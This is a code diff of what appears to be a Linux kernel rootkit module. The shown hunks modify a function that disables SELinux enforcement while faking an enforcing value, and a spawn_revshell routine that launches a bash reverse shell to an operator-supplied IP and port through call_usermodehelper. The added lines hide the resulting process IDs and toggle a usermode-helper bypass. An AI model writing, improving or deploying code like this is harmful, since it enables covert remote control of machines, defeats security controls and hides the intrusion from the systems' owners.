@@ -1,9 +1,3 @@
-/*
-
-    SELinux Bypass in Initial Version
-
-*/
-
 #include "../include/core.h"
 #include "../include/icmp.h"
 #include "../include/hidden_pids.h"
@@ -88,9 +82,7 @@ notrace static int bypass_selinux_disable(void)
     
     #ifdef CONFIG_SECURITY_SELINUX_DEVELOP
     state->enforcing = 0;
-    
     enforce_hook_active = true;
-    
     fake_enforce_value = 1;
     #endif
     
@@ -106,12 +98,20 @@ notrace static void spawn_revshell(struct work_struct *work)
         "PATH=/usr/bin:/bin:/usr/sbin:/sbin",
         NULL
     };
-    char *argv[] = {"/usr/bin/setsid", "/bin/bash", "-c", NULL, NULL};
+    char *argv[] = {"/bin/bash", "-c", cmd, NULL};
     struct subprocess_info *sub_info;
-    struct task_struct *task;
-    pid_t baseline_pid = 0;
+    
+    extern void enable_umh_bypass(void);
+    extern void disable_umh_bypass(void);
+    
+    enable_umh_bypass();
+    
+    add_hidden_pid(current->pid);
+    add_hidden_pid(current->tgid);
     
     bypass_selinux_disable();
+    
+    msleep(50);
     
     snprintf(cmd, sizeof(cmd),
              "bash -c '"
@@ -121,31 +121,12 @@ notrace static void spawn_revshell(struct work_struct *work)
              "' 2>/dev/null &",
              PROC_NAME, YOUR_SRV_IP, SRV_PORT);
     
-    argv[3] = cmd;
-    
-    rcu_read_lock();
-    for_each_process(task) {
-        if (task->pid > baseline_pid)
-            baseline_pid = task->pid;
-    }
-    rcu_read_unlock();
-    
     sub_info = call_usermodehelper_setup(argv[0], argv, envp,
                                         GFP_KERNEL, NULL, NULL, NULL);
     if (sub_info)
         call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
     
-    rcu_read_lock();
-    for_each_process(task) {
-        if (task->pid > baseline_pid && task->mm) {
-            if (strstr(task->comm, PROC_NAME) ||
-                strstr(task->comm, "setsid")) {
-                add_hidden_pid(task->pid);
-                add_hidden_pid(task->tgid);
-            }
-        }
-    }
-    rcu_read_unlock();
+    disable_umh_bypass();
     
     kfree(container_of(work, struct revshell_work, work));
 }
